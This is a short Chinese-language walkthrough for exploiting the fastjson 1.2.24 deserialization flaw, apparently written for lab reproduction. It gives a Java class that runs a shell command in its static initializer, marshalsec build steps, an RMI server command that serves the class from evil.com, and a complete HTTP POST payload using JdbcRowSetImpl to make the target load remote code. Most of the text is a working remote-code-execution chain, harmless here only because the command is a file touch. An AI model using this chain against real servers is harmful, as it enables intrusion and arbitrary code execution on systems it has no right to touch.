## fastjson 1.2.24 反序列化漏洞

#### 未知目标是否使用fastjson
	有原始报错回显: 不闭合花括号进行保存回显
	无回显： java系json处理只有fastjson和jackson，由于jackson相对比较严格

#### 编译命令执行代码
	javac TouchFile.java

	import java.lang.Runtime;
	import java.lang.Process;
	
	public class TouchFile {
	    static {
	        try {
	            Runtime rt = Runtime.getRuntime();
	            String[] commands = {"touch", "/tmp/success"};
	            Process pc = rt.exec(commands);
	            pc.waitFor();
	        } catch (Exception e) {
	            // do nothing
	        }
	    }
	}

#### 将TouchFile.class放置网站路径下
	http://192.169.1.1/TouchFile.classs

#### 下载marshalsec并打包
	https://github.com/mbechler/marshalsec
	
	下载mvn
	wget https://mirrors.tuna.tsinghua.edu.cn/apache/maven/maven-3/3.6.3/binaries/apache-maven-3.6.3-bin.tar.gz

	打包(需要java环境变量)
	cd marshalsec
	/root/apache-maven-3.6.3/bin/./mvn clean package -DskipTests

#### 启动一个RMI服务器，监听9999端口，并制定加载远程类`TouchFile.class`：
	java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://evil.com/#TouchFile" 9999

#### 执行payloda
	POST / HTTP/1.1
	Host: your-ip:8090
	Accept-Encoding: gzip, deflate
	Accept: */*
	Accept-Language: en
	User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
	Connection: close
	Content-Type: application/json
	Content-Length: 160

	{
    	"b":{
        	"@type":"com.sun.rowset.JdbcRowSetImpl",
        	"dataSourceName":"rmi://evil.com:9999/TouchFile",
        	"autoCommit":true
    	}
	}

	
